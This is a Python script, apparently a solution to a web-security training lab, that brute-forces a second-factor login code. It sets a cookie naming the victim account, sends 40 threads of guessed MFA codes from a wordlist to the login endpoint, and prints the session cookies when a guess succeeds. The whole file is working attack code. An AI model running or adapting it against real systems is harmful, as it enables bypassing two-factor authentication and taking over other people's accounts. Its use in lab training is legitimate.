import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if (len(sys.argv) != 2):
    print("USAGE: exploit.py <url>")
    sys.exit(1)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = sys.argv[1]
attacker = "wiener"
victim = "carlos"

found = False
def post_req(url, headers, data,i):
    p = requests.post(url+'login2', headers=headers, data=data,  allow_redirects= False,proxies=proxies,verify=False)
    print("i am in {0},{1}".format(i,p.status_code),end="\r",flush=True)
    if "Incorrect security code" not in p.text:
        print(p.cookies)
        print(data)
        found = True
    return p
r = requests.get(url)
cookie_value = r.cookies['session']

headers = {'Cookie' : 'session='+ cookie_value+'; verify='+victim}
r1 = requests.get(url+'login2',headers=headers,proxies=proxies,verify=False)

print("request sent")
#print(cookie_value)
file1 = open('creds/otp_pay','r')
opts = file1.readlines()


processes = []
i = 1
with ThreadPoolExecutor(max_workers=40) as executor:
    for opt in opts:
        print("{}".format(i),end="\r",flush=True)
        i = i + 1
        headers = {'Cookie' : 'session='+ cookie_value+'; verify='+victim}
        data = {'mfa-code' : str(opt)[:-1]}
        processes.append(executor.submit(post_req,url,headers,data,i))
    


    

